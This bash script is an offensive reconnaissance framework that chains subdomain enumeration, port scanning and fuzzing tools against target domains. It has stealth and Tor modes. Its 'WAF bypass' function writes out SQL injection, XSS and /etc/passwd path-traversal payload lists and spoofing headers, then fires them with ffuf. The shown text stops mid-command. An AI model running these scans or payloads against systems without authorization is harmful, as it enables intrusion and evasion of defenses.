#!/bin/bash
# ════════════════════════════════════════════════════════════════════════════
# 🚀 ARF - ADVANCED RECONNAISSANCE FRAMEWORK v3.0
# 🔐 AUTHORIZED USE ONLY - REQUIRE SUDO PRIVILEGES
# 📅 Updated: March 2026
# 📁 MULTI-TARGET FILES (-f/--targets) | WAF BYPASS | HTML REPORTS
# ════════════════════════════════════════════════════════════════════════════
set -euo pipefail

# ─── CONFIGURATION ───────────────────────────────────────────────────────────
readonly VERSION="3.0.0"
readonly SCRIPT_NAME="$(basename "$0")"
readonly SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CONFIG_FILE="${HOME}/.recon_config"
readonly LOCK_FILE="/tmp/recon_$$.lock"

# ─── COLORS & FORMATTING ─────────────────────────────────────────────────────
declare -A COLORS=(
    [RED]='\033[0;31m'
    [GREEN]='\033[0;32m'
    [YELLOW]='\033[1;33m'
    [BLUE]='\033[0;34m'
    [CYAN]='\033[0;36m'
    [MAGENTA]='\033[0;35m'
    [WHITE]='\033[1;37m'
    [BOLD]='\033[1m'
    [DIM]='\033[2m'
    [RESET]='\033[0m'
)

# ─── LOGGING SETUP ───────────────────────────────────────────────────────────
LOG_LEVEL="${LOG_LEVEL:-INFO}"
# FIXED: Initialize LOG_FILE early before any logging
LOG_FILE="/tmp/recon_$$.log"
declare -A LOG_LEVELS=([DEBUG]=0 [INFO]=1 [WARN]=2 [ERROR]=3)

log() {
    local level="$1"
    shift
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local color="${COLORS[${level}]:-${COLORS[WHITE]}}"
    # FIXED: Check LOG_FILE exists before writing
    [[ ${LOG_LEVELS[$level]:-1} -ge ${LOG_LEVELS[$LOG_LEVEL]:-1} ]] && \
        echo -e "${color}[${timestamp}] [${level}]${COLORS[RESET]} $*" >> "$LOG_FILE" 2>/dev/null || true
    [[ "$level" != "DEBUG" ]] && echo -e "${color}[${level}]${COLORS[RESET]} $*"
}

info()    { log "INFO" "$*"; }
success() { log "INFO" "${COLORS[GREEN]}[+]${COLORS[RESET]} $*"; }
warn()    { log "WARN" "${COLORS[YELLOW]}[!]${COLORS[RESET]} $*"; }
error()   { log "ERROR" "${COLORS[RED]}[✗]${COLORS[RESET]} $*"; exit 1; }
debug()   { log "DEBUG" "${COLORS[DIM]}[•]${COLORS[RESET]} $*"; }

section() {
    echo -e "\n${COLORS[BOLD]}${COLORS[CYAN]}╔══════════════════════════════════════════════════════════════╗${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[GREEN]}  ║  $*${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}╚══════════════════════════════════════════════════════════════╝${COLORS[RESET]}"
}

# ─── SUDO ENFORCEMENT ────────────────────────────────────────────────────────
enforce_sudo() {
    if [[ $EUID -ne 0 ]]; then
        error "${COLORS[RED]}This script MUST be run with sudo privileges!${COLORS[RESET]}"
        error "Usage: sudo $0 <target.com> [options]"
        error "   or: sudo $0 -f targets.txt [options]"
        exit 1
    fi
    success "Running with root privileges (EUID: $EUID)"
}

# ─── CLEANUP & SIGNAL HANDLING ───────────────────────────────────────────────
cleanup() {
    local exit_code=$?
    info "Cleaning up temporary files..."
    rm -f "$LOCK_FILE" 2>/dev/null || true
    [[ -n "${TEMP_DIR:-}" && -d "$TEMP_DIR" ]] && rm -rf "$TEMP_DIR" 2>/dev/null || true
    if [[ $exit_code -ne 0 ]]; then
        warn "Script exited with code: $exit_code"
        [[ -f "$LOG_FILE" ]] && warn "Check log: $LOG_FILE"
    fi
    exit $exit_code
}
trap cleanup EXIT INT TERM HUP

# ─── ARGUMENT PARSING ────────────────────────────────────────────────────────
TARGET=""
TARGETS_FILE=""
THREADS=""
RATE_LIMIT=""
CRAWL_DEPTH=""
TIMEOUT=""
WAF_BYPASS="false"
AGGRESSIVE="false"
STEALTH_MODE="false"
HTML_REPORT="false"
JSON_REPORT="false"
PARALLEL_TARGETS="1"
SKIP_DONE="false"
SKIP_INSTALL="false"
USE_TOR="false"
PROXY=""
SCOPE_FILE=""
OUTDIR=""
API_KEYS_FILE=""
NOTIFY_CHANNEL=""
RESUME_ID=""
LOG_LEVEL="INFO"

parse_args() {
    [[ -z "$1" ]] && error "Usage: sudo $0 <target.com> [options] OR sudo $0 -f targets.txt [options]"
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -f|--targets)       TARGETS_FILE="$2"; shift 2 ;;
            --threads)          THREADS="$2"; shift 2 ;;
            --scope)            SCOPE_FILE="$2"; shift 2 ;;
            --output)           OUTDIR="$2"; shift 2 ;;
            --config)           CONFIG_FILE="$2"; shift 2 ;;  # FIXED: CONFIG_FILE not readonly
            --proxy)            PROXY="$2"; shift 2 ;;
            --tor)              USE_TOR=true; shift ;;
            --rate-limit)       RATE_LIMIT="$2"; shift 2 ;;
            --depth)            CRAWL_DEPTH="$2"; shift 2 ;;
            --timeout)          TIMEOUT="$2"; shift 2 ;;
            --api-keys)         API_KEYS_FILE="$2"; shift 2 ;;
            --waf-bypass)       WAF_BYPASS=true; shift ;;
            --aggressive)       AGGRESSIVE=true; shift ;;
            --stealth)          STEALTH_MODE=true; shift ;;
            --resume)           RESUME_ID="$2"; shift 2 ;;
            --notify)           NOTIFY_CHANNEL="$2"; shift 2 ;;
            --html-report)      HTML_REPORT=true; shift ;;
            --json-report)      JSON_REPORT=true; shift ;;
            --skip-install)     SKIP_INSTALL=true; shift ;;
            --debug)            LOG_LEVEL="DEBUG"; shift ;;
            --quiet)            LOG_LEVEL="ERROR"; shift ;;
            --parallel)         PARALLEL_TARGETS="$2"; shift 2 ;;
            --skip-done)        SKIP_DONE=true; shift ;;
            --help|-h)          show_help; exit 0 ;;
            --version|-v)       echo "ReconFramework v${VERSION}"; exit 0 ;;
            -*)                 error "Unknown option: $1" ;;
            *)                  TARGET="$1"; shift ;;
        esac
    done
    
    # Validate input
    if [[ -n "$TARGETS_FILE" ]]; then
        [[ ! -f "$TARGETS_FILE" ]] && error "Targets file not found: $TARGETS_FILE"
        [[ ! -r "$TARGETS_FILE" ]] && error "Cannot read targets file: $TARGETS_FILE"
        info "Loading targets from file: $TARGETS_FILE"
    elif [[ -n "$TARGET" ]]; then
        # FIXED: Better domain validation with sanitization
        TARGET=$(echo "$TARGET" | tr -cd 'a-zA-Z0-9.-')
        if ! [[ "$TARGET" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
            warn "Target may not be a valid domain: $TARGET"
        fi
    else
        error "Either provide a target domain or use -f/--targets for a file"
    fi
}

show_help() {
    # Banner
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}╔══════════════════════════════════════════════════════════════╗${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}                                                              ${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}  ${COLORS[BOLD]}🚀 ARF - Advanced Reconnaissance Framework v${VERSION}           ${COLORS[RESET]}  ${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}  ${COLORS[DIM]}Enterprise-grade reconnaissance & vulnerability scanner${COLORS[RESET]}   ${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}                                                              ${COLORS[BOLD]}${COLORS[CYAN]}║${COLORS[RESET]}"
    echo -e "${COLORS[BOLD]}${COLORS[CYAN]}╚══════════════════════════════════════════════════════════════╝${COLORS[RESET]}"
    echo
    cat << EOF
${COLORS[BOLD]}USAGE:${COLORS[RESET]}
    sudo arf <target.com> [options]
    sudo arf -f targets.txt [options]

${COLORS[BOLD]}REQUIRED (ONE OF):${COLORS[RESET]}
    <target.com>          Single target domain (e.g., example.com)
    -f, --targets FILE    File containing multiple targets (one per line)

${COLORS[BOLD]}CORE OPTIONS:${COLORS[RESET]}
    --threads N           Number of concurrent threads (default: 200)
    --output DIR          Output directory (default: recon_<target>_<timestamp>)
    --config FILE         Configuration file (default: ~/.recon_config)
    --api-keys FILE       File containing API keys
    --scope FILE          Scope file with allowed domains (bug bounty)

${COLORS[BOLD]}PERFORMANCE & NETWORK:${COLORS[RESET]}
    --rate-limit N        Requests per second (default: 50)
    --depth N             Crawl depth for URL discovery (default: 5)
    --timeout N           Request timeout in seconds (default: 10)
    --proxy URL           HTTP/HTTPS proxy URL
    --tor                 Route traffic through Tor network
    --parallel N          Process N targets in parallel (default: 1)

${COLORS[BOLD]}SCANNING MODES:${COLORS[RESET]}
    --waf-bypass          Enable WAF detection and bypass techniques
    --aggressive          Aggressive mode (faster, more detectable)
    --stealth             Stealth mode (slower, less detectable)

${COLORS[BOLD]}REPORTING & OUTPUT:${COLORS[RESET]}
    --html-report         Generate HTML report
    --json-report         Generate JSON report
    --debug               Enable debug logging
    --quiet               Minimal output (errors only)

${COLORS[BOLD]}BATCH PROCESSING:${COLORS[RESET]}
    --skip-done           Skip targets that already have completed reports
    --resume ID           Resume previous scan by ID

${COLORS[BOLD]}NOTIFICATIONS:${COLORS[RESET]}
    --notify CHANNEL      Notification channel (slack/discord/telegram)

${COLORS[BOLD]}GENERAL:${COLORS[RESET]}
    --skip-install        Skip tool installation check
    --help, -h            Show this help message
    --version, -v         Show version information

${COLORS[BOLD]}EXAMPLES:${COLORS[RESET]}
    ${COLORS[DIM]}# Basic scan of a single target${COLORS[RESET]}
    sudo arf example.com

    ${COLORS[DIM]}# Scan with WAF bypass and HTML report${COLORS[RESET]}
    sudo arf example.com --waf-bypass --html-report

    ${COLORS[DIM]}# Scan multiple targets from file${COLORS[RESET]}
    sudo arf -f targets.txt

    ${COLORS[DIM]}# Parallel batch scan with notifications${COLORS[RESET]}
    sudo arf -f targets.txt --parallel 3 --notify discord --html-report

    ${COLORS[DIM]}# Stealth mode scan (low-profile)${COLORS[RESET]}
    sudo arf example.com --stealth --threads 50 --rate-limit 10

    ${COLORS[DIM]}# Aggressive full scan with all reports${COLORS[RESET]}
    sudo arf example.com --aggressive --html-report --json-report --api-keys ~/api_keys.sh

    ${COLORS[DIM]}# Scan through Tor${COLORS[RESET]}
    sudo arf example.com --tor --stealth

    ${COLORS[DIM]}# Scan with custom output directory${COLORS[RESET]}
    sudo arf example.com --output /path/to/results

${COLORS[BOLD]}TARGETS FILE FORMAT:${COLORS[RESET]}
    ${COLORS[DIM]}# Comments start with #${COLORS[RESET]}
    ${COLORS[DIM]}example.com${COLORS[RESET]}
    ${COLORS[DIM]}api.example.com${COLORS[RESET]}
    ${COLORS[DIM]}test.example.org${COLORS[RESET]}

${COLORS[BOLD]}QUICK START:${COLORS[RESET]}
    ${COLORS[CYAN]}1.${COLORS[RESET]} Run setup:          ${COLORS[GREEN]}sudo arf --setup${COLORS[RESET]}
    ${COLORS[CYAN]}2.${COLORS[RESET]} Edit config:        ${COLORS[GREEN]}nano ~/.recon_config${COLORS[RESET]}
    ${COLORS[CYAN]}3.${COLORS[RESET]} Add API keys:       ${COLORS[GREEN]}nano ~/api_keys.sh${COLORS[RESET]}
    ${COLORS[CYAN]}4.${COLORS[RESET]} Start scanning:     ${COLORS[GREEN]}sudo arf example.com${COLORS[RESET]}

${COLORS[BOLD]}OUTPUT STRUCTURE:${COLORS[RESET]}
    ${COLORS[DIM]}recon_<target>_<timestamp>/${COLORS[RESET]}
    ├── ${COLORS[DIM]}subs/${COLORS[RESET]}         # Subdomain enumeration results
    ├── ${COLORS[DIM]}urls/${COLORS[RESET]}         # Live hosts and URLs
    ├── ${COLORS[DIM]}fuzz/${COLORS[RESET]}         # Directory/parameter fuzzing results
    ├── ${COLORS[DIM]}js/${COLORS[RESET]}           # JavaScript analysis
    ├── ${COLORS[DIM]}vulns/${COLORS[RESET]}        # Vulnerability findings
    ├── ${COLORS[DIM]}cloud/${COLORS[RESET]}        # Cloud bucket discoveries
    ├── ${COLORS[DIM]}github/${COLORS[RESET]}       # GitHub dorking results
    ├── ${COLORS[DIM]}screenshots/${COLORS[RESET]}  # Website screenshots
    └── ${COLORS[DIM]}reports/${COLORS[RESET]}      # Summary reports (txt/json/html)

${COLORS[BOLD]}IMPORTANT NOTES:${COLORS[RESET]}
    ${COLORS[YELLOW]}!${COLORS[RESET]} This tool requires ${COLORS[BOLD]}sudo${COLORS[RESET]} privileges for network operations
    ${COLORS[YELLOW]}!${COLORS[RESET]} Only scan targets you ${COLORS[BOLD]}own${COLORS[RESET]} or have ${COLORS[BOLD]}written permission${COLORS[RESET]} to test
    ${COLORS[YELLOW]}!${COLORS[RESET]} Keep API keys secure: ${COLORS[GREEN]}chmod 600 ~/api_keys.sh${COLORS[RESET]}

${COLORS[BOLD]}LEGAL DISCLAIMER:${COLORS[RESET]}
    ${COLORS[RED]}⚠️  This tool is for authorized security testing only.${COLORS[RESET]}
    ${COLORS[RED]}   Unauthorized scanning of systems is illegal and may result in prosecution.${COLORS[RESET]}

EOF
}

# ─── LOAD CONFIGURATION ──────────────────────────────────────────────────────
load_config() {
    [[ -f "$CONFIG_FILE" ]] && source "$CONFIG_FILE" 2>/dev/null || true
    
    # Defaults
    THREADS="${THREADS:-200}"
    RATE_LIMIT="${RATE_LIMIT:-50}"
    CRAWL_DEPTH="${CRAWL_DEPTH:-5}"
    TIMEOUT="${TIMEOUT:-10}"
    USE_TOR="${USE_TOR:-false}"
    WAF_BYPASS="${WAF_BYPASS:-false}"
    AGGRESSIVE="${AGGRESSIVE:-false}"
    STEALTH_MODE="${STEALTH_MODE:-false}"
    HTML_REPORT="${HTML_REPORT:-false}"
    JSON_REPORT="${JSON_REPORT:-false}"
    PARALLEL_TARGETS="${PARALLEL_TARGETS:-1}"
    SKIP_DONE="${SKIP_DONE:-false}"
    
    # Adjust for stealth mode
    if [[ "$STEALTH_MODE" == "true" ]]; then
        THREADS=50
        RATE_LIMIT=10
        info "${COLORS[YELLOW]}Stealth mode enabled - reduced thread count and rate limit${COLORS[RESET]}"
    fi
    
    # Adjust for aggressive mode
    if [[ "$AGGRESSIVE" == "true" ]]; then
        THREADS=500
        RATE_LIMIT=100
        warn "${COLORS[YELLOW]}Aggressive mode enabled - high thread count may trigger IDS/WAF${COLORS[RESET]}"
    fi
}

# ─── LOAD API KEYS ───────────────────────────────────────────────────────────
load_api_keys() {
    if [[ -n "${API_KEYS_FILE:-}" && -f "$API_KEYS_FILE" ]]; then
        source "$API_KEYS_FILE" 2>/dev/null || true
        info "API keys loaded from: $API_KEYS_FILE"
    fi
    
    # Export common API keys
    export SHODAN_API_KEY="${SHODAN_API_KEY:-}"
    export CENSYS_API_ID="${CENSYS_API_ID:-}"
    export CENSYS_API_SECRET="${CENSYS_API_SECRET:-}"
    export VIRUSTOTAL_API_KEY="${VIRUSTOTAL_API_KEY:-}"
    export SECURITYTRAILS_API_KEY="${SECURITYTRAILS_API_KEY:-}"
    export BINARYEDGE_API_KEY="${BINARYEDGE_API_KEY:-}"
    export GITHUB_TOKEN="${GITHUB_TOKEN:-}"
    export SLACK_WEBHOOK="${SLACK_WEBHOOK:-}"
    export DISCORD_WEBHOOK="${DISCORD_WEBHOOK:-}"
    export TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
    export TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"
}

# ─── TARGET FILE PARSER ──────────────────────────────────────────────────────
parse_targets_file() {
    local file="$1"
    local targets=()
    
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip empty lines and comments
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue
        
        # Trim whitespace
        line=$(echo "$line" | xargs)
        
        # FIXED: Better domain validation with sanitization
        line=$(echo "$line" | tr -cd 'a-zA-Z0-9.-')
        
        # Validate domain format (basic check)
        if [[ "$line" =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
            targets+=("$line")
        else
            warn "Invalid domain format, skipping: $line"
        fi
    done < "$file"
    
    # Remove duplicates
    printf '%s\n' "${targets[@]}" | sort -u
}

# ─── CHECK IF TARGET COMPLETED ───────────────────────────────────────────────
is_target_completed() {
    local target="$1"
    local base_dir="${OUTDIR_BASE:-recon_batch}"
    
    # Check if report exists
    [[ -f "${base_dir}/recon_${target}_*/reports/summary_*.txt" ]] && return 0
    return 1
}

# ─── TOOL INSTALLATION ───────────────────────────────────────────────────────
declare -A TOOLS=(
    # Go tools
    [subfinder]="github.com/projectdiscovery/subfinder/v2/cmd/subfinder"
    [assetfinder]="github.com/tomnomnom/assetfinder"
    [httpx]="github.com/projectdiscovery/httpx/cmd/httpx"
    [katana]="github.com/projectdiscovery/katana/cmd/katana"
    [nuclei]="github.com/projectdiscovery/nuclei/v3/cmd/nuclei"
    [dnsx]="github.com/projectdiscovery/dnsx/cmd/dnsx"
    [naabu]="github.com/projectdiscovery/naabu/v2/cmd/naabu"
    [ffuf]="github.com/ffuf/ffuf/v2"
    [waybackurls]="github.com/tomnomnom/waybackurls"
    [gau]="github.com/lc/gau/v2/cmd/gau"
    [alterx]="github.com/projectdiscovery/alterx/cmd/alterx"
    [dalfox]="github.com/hahwul/dalfox/v2"
    [hakrawler]="github.com/hakluke/hakrawler"
    [gospider]="github.com/jaeles-project/gospider"
    [subzy]="github.com/LukaSikic/subzy"
    [gowitness]="github.com/sensepost/gowitness"
    [cdncheck]="github.com/projectdiscovery/cdncheck/cmd/cdncheck"
    [tlsx]="github.com/projectdiscovery/tlsx/cmd/tlsx"
    # Python tools
    [wafw00f]="wafw00f"
    [sqlmap]="sqlmap"
    [whatweb]="whatweb"
    # APT tools
    [amass]="amass"
    [nmap]="nmap"
    [curl]="curl"
    [jq]="jq"
    [git]="git"
    [bc]="bc"
)

install_go_tool() {
    local cmd="$1"
    local pkg="$2"
    
    if ! command -v "$cmd" &>/dev/null; then
        if [[ "${SKIP_INSTALL:-false}" != "true" ]]; then
            warn "${COLORS[YELLOW]}$cmd${COLORS[RESET]} not found — installing via Go..."
            export PATH="$PATH:$(go env GOPATH 2>/dev/null || echo ~/go)/bin"
            go install "$pkg"@latest 2>/dev/null && \
                success "$cmd installed successfully" || \
                warn "Failed to install $cmd"
        else
            warn "$cmd not found (installation skipped)"
        fi
    fi
}

install_apt_tool() {
    local cmd="$1"
    local pkg="${2:-$1}"
    
    if ! command -v "$cmd" &>/dev/null; then
        if [[ "${SKIP_INSTALL:-false}" != "true" ]]; then
            warn "${COLORS[YELLOW]}$cmd${COLORS[RESET]} not found — installing via apt..."
            apt-get update -qq 2>/dev/null
            apt-get install -y "$pkg" -qq 2>/dev/null && \
                success "$cmd installed successfully" || \
                warn "Failed to install $cmd"
        else
            warn "$cmd not found (installation skipped)"
        fi
    fi
}

install_pip_tool() {
    local cmd="$1"
    local pkg="${2:-$1}"
    
    if ! command -v "$cmd" &>/dev/null; then
        if [[ "${SKIP_INSTALL:-false}" != "true" ]]; then
            warn "${COLORS[YELLOW]}$cmd${COLORS[RESET]} not found — installing via pip..."
            # FIXED: Handle modern Python externally-managed-environment
            pip3 install --break-system-packages "$pkg" -q 2>/dev/null || \
            pip3 install "$pkg" -q 2>/dev/null && \
                success "$cmd installed successfully" || \
                warn "Failed to install $cmd"
        else
            warn "$cmd not found (installation skipped)"
        fi
    fi
}

check_and_install_tools() {
    section "🔧 TOOL VERIFICATION & INSTALLATION"
    
    # Check Go installation
    if ! command -v go &>/dev/null; then
        error "Go is required but not installed. Install from: https://go.dev/dl/"
    fi
    
    # FIXED: Check bc installation
    if ! command -v bc &>/dev/null; then
        warn "bc not found - installing..."
        apt-get install -y bc -qq 2>/dev/null || true
    fi
    
    info "Installing Go-based tools..."
    for tool in "${!TOOLS[@]}"; do
        case "$tool" in
            wafw00f|sqlmap|whatweb)
                install_pip_tool "$tool" "${TOOLS[$tool]}"
                ;;
            amass|nmap|curl|jq|git|bc)
                install_apt_tool "$tool" "${TOOLS[$tool]}"
                ;;
            *)
                install_go_tool "$tool" "${TOOLS[$tool]}"
                ;;
        esac
    done
    
    # Install SecLists
    if [[ ! -d /usr/share/seclists ]]; then
        warn "SecLists not found — installing..."
        git clone --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists 2>/dev/null || \
            warn "SecLists installation failed"
    fi
    
    # Update nuclei templates
    if command -v nuclei &>/dev/null; then
        info "Updating nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null || true
    fi
    
    success "Tool verification complete"
}

# ─── WORDLIST MANAGEMENT ─────────────────────────────────────────────────────
setup_wordlists() {
    SECLISTS="/usr/share/seclists"
    
    DIR_WORDLISTS=(
        "$SECLISTS/Discovery/Web-Content/directory-list-2.3-big.txt"
        "$SECLISTS/Discovery/Web-Content/common-directories.txt"
        "/usr/share/wordlists/dirb/big.txt"
    )
    
    PARAM_WORDLISTS=(
        "$SECLISTS/Discovery/Web-Content/burp-parameter-names.txt"
        "$SECLISTS/Discovery/Web-Content/common-parameters.txt"
    )
    
    VHOST_WORDLISTS=(
        "$SECLISTS/Discovery/DNS/subdomains-top1million-5000.txt"
        "$SECLISTS/Discovery/DNS/subdomains-top1million-110000.txt"
    )
    
    FUZZ_WORDLISTS=(
        "$SECLISTS/Fuzzing/fuzz-Lfi-jhaddix.txt"
        "$SECLISTS/Fuzzing/fuzz-MSSQL.txt"
        "$SECLISTS/Fuzzing/fuzz-XXE.txt"
    )
    
    WAF_BYPASS_PAYLOADS=(
        "$SECLISTS/Fuzzing/WAF-Bypass/*.txt"
    )
    
    # Find first available wordlist
    for list in "${DIR_WORDLISTS[@]}"; do
        [[ -f "$list" ]] && DIR_WORDLIST="$list" && break
    done
    
    for list in "${PARAM_WORDLISTS[@]}"; do
        [[ -f "$list" ]] && PARAM_WORDLIST="$list" && break
    done
    
    for list in "${VHOST_WORDLISTS[@]}"; do
        [[ -f "$list" ]] && VHOST_WORDLIST="$list" && break
    done
    
    for list in "${FUZZ_WORDLISTS[@]}"; do
        [[ -f "$list" ]] && FUZZ_WORDLIST="$list" && break
    done
    
    info "Wordlists configured"
}

# ─── WAF DETECTION & BYPASS ──────────────────────────────────────────────────
detect_waf() {
    section "🛡️ WAF DETECTION"
    local waf_results="vulns/waf_detection.txt"
    mkdir -p "$(dirname "$waf_results")"
    
    if command -v wafw00f &>/dev/null; then
        info "Running wafw00f..."
        wafw00f -a "https://$TARGET" 2>/dev/null | tee "$waf_results" || true
    fi
    
    # Additional WAF detection via httpx
    if command -v httpx &>/dev/null; then
        info "Checking WAF headers with httpx..."
        echo "https://$TARGET" | httpx -silent -include-response | \
            grep -iE "(server|x-cdn|x-waf|cloudflare|akamai|sucuri|incapsula)" >> "$waf_results" 2>/dev/null || true
    fi
    
    # Detect CDN
    if command -v cdncheck &>/dev/null; then
        info "Checking CDN presence..."
        cdncheck -host "$TARGET" -silent 2>/dev/null || true
    fi
    
    if [[ -s "$waf_results" ]]; then
        warn "WAF/CDN detected - enabling bypass techniques"
        return 0
    else
        info "No WAF detected"
        return 1
    fi
}

waf_bypass_techniques() {
    section "🔓 WAF BYPASS TECHNIQUES"
    local bypass_dir="fuzz/waf_bypass"
    mkdir -p "$bypass_dir"
    
    info "Preparing WAF bypass payloads..."
    
    # Common WAF bypass headers
    cat > "$bypass_dir/bypass_headers.txt" << 'EOF'
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-Forwarded-Port: 443
X-Original-Host: 127.0.0.1
Contact: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Proxy-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 127.0.0.1
EOF
    
    # Encoding bypass payloads
    cat > "$bypass_dir/encoding_bypass.txt" << 'EOF'
%2e%2e%2f
..%2f
%252e%252e%252f
..%255c
%00
%09
%0a
%0d
/*
//
/**/
;%0d
;%0a
%3b
EOF
    
    # SQL injection bypass payloads
    cat > "$bypass_dir/sqli_bypass.txt" << 'EOF'
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
' OR '1'='1' /*
admin'--
' UNION SELECT NULL--
1' ORDER BY 1--
1' GROUP BY 1--
%27%20OR%20%271%27%3D%271
%22%20OR%20%221%22%3D%221
EOF
    
    # XSS bypass payloads
    cat > "$bypass_dir/xss_bypass.txt" << 'EOF'
<script>alert(1)</script>
<svg/onload=alert(1)>
<img/src=x onerror=alert(1)>
<body/onload=alert(1)>
<iframe/src=javascript:alert(1)>
javascript:alert(1)
text/html,<script>alert(1)</script>
%3Cscript%3Ealert(1)%3C/script%3E
%3Csvg/onload=alert(1)%3E
EOF
    
    # Path traversal bypass
    cat > "$bypass_dir/lfi_bypass.txt" << 'EOF'
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
....\\/....\\/....\\/etc/passwd
..\\..\\..\\etc/passwd
%00/etc/passwd
/etc/passwd%00
....//....//....//etc/passwd%00
EOF
    
    success "WAF bypass payloads generated in: $bypass_dir"
    
    # Run FFUF with bypass headers if URLs available
    if [[ -f "urls/alive_urls.txt" && command -v ffuf &>/dev/null ]]; then
        info "Testing WAF bypass on live hosts..."
        head -10 urls/alive_urls.txt | while read -r url; do
            ffuf -u "$url" \
                -H "X-Forwarded-For: 127.0.0.1" \
                -H "X-Original-URL: /admin" \
                -w "$bypass_dir/encoding_bypass.txt:FUZZ" \
                -fc 404 -ac -t 20 \
                -silent \
                -o "$bypass_dir/bypass_results.json" -of json 2>/dev/null || true
        done
    fi
}

# ─── SUBDOMAIN ENUMERATION ───────────────────────────────────────────────────
enumerate_subdomains() {
    section "🧠 SUBDOMAIN ENUMERATION"
    mkdir -p subs
    
    # Passive enumeration
    info "Running subfinder..."
    subfinder -d "$TARGET" -all -recursive -silent -o subs/subfinder.txt 2>/dev/null || true
    
    info "Running assetfinder..."
    assetfinder --subs-only "$TARGET" > subs/assetfinder.txt 2>/dev/null || true
    
    info "Running alterx (custom patterns)..."
    alterx -d "$TARGET" -silent -o subs/alterx.txt 2>/dev/null || true
    
    info "Running amass (passive)..."
    command -v amass &>/dev/null && \
        amass enum -passive -d "$TARGET" -o subs/amass.txt 2>/dev/null || true
    
    # API-based enumeration
    info "Querying certificate transparency logs..."
    curl -s "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null | \
        jq -r '.[].name_value' 2>/dev/null | \
        sed 's/\*\.//g' | sort -u > subs/crtsh.txt || true
    
    # Additional sources
    info "Querying multiple sources..."
    for source in hackertarget virustotal securitytrails; do
        case "$source" in
            hackertarget)
                curl -s "https://api.hackertarget.com/hostsearch/?q=$TARGET" 2>/dev/null | \
                    cut -d',' -f1 | sort -u > subs/hackertarget.txt || true
                ;;
            virustotal)
                [[ -n "$VIRUSTOTAL_API_KEY" ]] && \
                    curl -s "https://www.virustotal.com/api/v3/domains/$TARGET/subdomains" \
                    -H "x-apikey: $VIRUSTOTAL_API_KEY" 2>/dev/null | \
                    jq -r '.data[].id' 2>/dev/null > subs/virustotal.txt || true
                ;;
            securitytrails)
                [[ -n "$SECURITYTRAILS_API_KEY" ]] && \
                    curl -s "https://api.securitytrails.com/v1/domain/$TARGET/subdomains" \
                    -H "APIKEY: $SECURITYTRAILS_API_KEY" 2>/dev/null | \
                    jq -r '.subdomains[]' 2>/dev/null | \
                    sed "s/$/.$TARGET/" > subs/securitytrails.txt || true
                ;;
        esac
    done
    
    # Merge and deduplicate
    info "Merging subdomain results..."
    cat subs/*.txt 2>/dev/null | sort -u | grep -E "$TARGET$" > subs/all_subs_raw.txt || true
    
    # DNS validation
    if command -v dnsx &>/dev/null; then
        info "Validating subdomains with dnsx..."
        dnsx -l subs/all_subs_raw.txt -silent -resp -o subs/all_subs.txt 2>/dev/null || \
            cp subs/all_subs_raw.txt subs/all_subs.txt
    else
        cp subs/all_subs_raw.txt subs/all_subs.txt
    fi
    
    local count=$(wc -l < subs/all_subs.txt 2>/dev/null || echo 0)
    success "Total unique subdomains: $count"
}

# ─── PORT SCANNING ───────────────────────────────────────────────────────────
scan_ports() {
    section "🔌 PORT SCANNING"
    
    if command -v naabu &>/dev/null; then
        info "Scanning common ports with naabu..."
        naabu -l subs/all_subs.txt \
            -p 80,443,8080,8000,8443,8888,3000,4000,5000,9000,21,22,23,25,53,110,143,3306,3389,5432,5900,6379,27017 \
            -silent -o subs/ports.txt 2>/dev/null || true
        success "Port scan complete: $(wc -l < subs/ports.txt 2>/dev/null || echo 0) results"
    fi
    
    # Nmap for detailed scan on critical hosts
    if command -v nmap &>/dev/null && [[ "$AGGRESSIVE" == "true" ]]; then
        warn "Running aggressive nmap scan (may be detected)..."
        head -20 subs/all_subs.txt | while read -r host; do
            nmap -sV -sC -T4 --open -oN "subs/nmap_${host}.txt" "$host" 2>/dev/null || true
        done
    fi
}

# ─── HOST ALIVE CHECK ────────────────────────────────────────────────────────
check_alive_hosts() {
    section "🌐 LIVE HOST DETECTION"
    mkdir -p urls
    
    info "Probing live hosts with httpx..."
    httpx -l subs/all_subs.txt \
        -threads "$THREADS" \
